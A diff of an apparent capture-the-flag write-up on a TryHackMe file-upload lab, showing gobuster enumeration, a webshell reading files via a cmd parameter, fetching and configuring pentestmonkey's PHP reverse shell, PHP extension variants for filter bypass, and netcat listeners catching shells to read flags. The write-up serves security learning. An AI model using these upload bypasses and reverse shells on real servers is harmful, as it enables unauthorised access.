@@ -55,7 +55,8 @@ view-source:http://shell.uploadvulns.thm/{REDACTED}/webshell.php?cmd=cat%20/var/
 But I like the reverse shell better
 
 ```
-root@ip-10-10-106-1:~# wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
+wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
+
 --2024-01-30 01:08:39--  https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
 Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.111.133, 185.199.110.133, 185.199.109.133, ...
 Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.111.133|:443... connected.
@@ -67,7 +68,7 @@ php-reverse-shell.p 100%[===================>]   5.36K  --.-KB/s    in 0s
 
 2024-01-30 01:08:39 (51.5 MB/s) - \u2018php-reverse-shell.php\u2019 saved [5491/5491]
 
-root@ip-10-10-106-1:~# sudo nano php-reverse-shell.php 
+sudo nano php-reverse-shell.php 
 
 ```
 Then change to my AttackBox IP and port 9000
@@ -111,3 +112,100 @@ usr
 var
 $ cat /var/www/flag.txt
 ```
+
+Bypassing Client-side filtering
+```
+gobuster dir -u http://java.uploadvulns.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
+
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://java.uploadvulns.thm
+[+] Threads:        10
+[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2024/01/30 20:39:03 Starting gobuster
+===============================================================
+/{REDACTED} (Status: 301)
+/assets (Status: 301)
+/server-status (Status: 403)
+
+```
+I initially had a hard time with Burpsuite, but maybe because I was distracted.  I managed to get the shell uploaded but couldn't get the reverse listener to work.
+
+My guess is that my parameter was missing in the reverse shell script, but perhaps its better just to restart everything fresh.  I originally thought it may have something to do with the magic numbers, but managed to upload successfully and get the flag.  Whew!
+```
+root@ip-10-10-34-10:~# nc -lvnp 9000
+Listening on [0.0.0.0] (family 0, port 9000)
+Connection from 10.10.209.29 33950 received!
+Linux a73553061b26 4.15.0-109-generic #110-Ubuntu SMP Tue Jun 23 02:39:32 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+ 01:19:17 up 31 min,  0 users,  load average: 0.00, 0.00, 0.14
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ cat /var/www/flag.txt
+THM{NDll(REDACTED)}
+
+```
+
+## Bypassing Server-Side Filtering:  File Extensions
+
+Gobuster again!
+```
+gobuster dir -u http://annex.uploadvulns.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
+
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://annex.uploadvulns.thm
+[+] Threads:        10
+[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2024/01/31 01:35:16 Starting gobuster
+===============================================================
+/privacy (Status: 301)
+/assets (Status: 301)
+/server-status (Status: 403)
+Progress: 146849 / 220561 (66.58%)^C
+[!] Keyboard interrupt detected, terminating.
+===============================================================
+2024/01/31 01:45:03 Finished
+
+```
+While its running I'm thinking of using Burp Suite Intuder to change it against different file types since it will be most likely looking for php
+.php3
+.php4
+.php5
+.php7
+.phps
+.php-s
+.pht
+.phar
+But this didn't work
+
+I manually edit the file type extension and got lucky
+![Image of uploadvulns]({{site.baseurl}}/assets/img/uploadvulns-bypass-server-side-filtering.png
+)
+
+```
+root@ip-10-10-34-10:~# nc -lvnp 9000
+Listening on [0.0.0.0] (family 0, port 9000)
+Connection from 10.10.209.29 44902 received!
+Linux a2b9a5609bd8 4.15.0-109-generic #110-Ubuntu SMP Tue Jun 23 02:39:32 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+ 02:00:04 up  1:12,  0 users,  load average: 0.00, 0.04, 0.17
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ cat /var/www/flag.txt
+THM{MGE{READACTED}
+
+```
+
